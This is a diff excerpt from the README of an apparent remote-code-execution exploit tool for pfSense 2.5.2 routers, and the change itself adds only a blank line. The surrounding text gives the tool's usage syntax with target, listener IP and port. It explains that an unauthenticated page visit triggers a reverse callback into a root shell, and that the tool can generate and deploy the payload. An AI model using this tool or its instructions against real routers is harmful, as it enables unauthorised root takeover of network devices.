@@ -11,6 +11,7 @@ Known issues:
  - Help: ./pfsense_252_rce -h or --help
  - Usage: ./pfsense_252_rce \<target router> \<filename on target> \<listener ip> \<listener port>
  - Once the listener has started, in a browser visit the malicious page hosted on the pfSense router. You do not need to be authenticated on the pfSense router in order to do this. On successful callback you will be in a root shell on the pfSense router.
+
 Note: If you do not have a payload on the pfSense router, the tool will generate the payload for you and provide deployment instructions. The listener will not start unless the malicious file is present. 
 
 
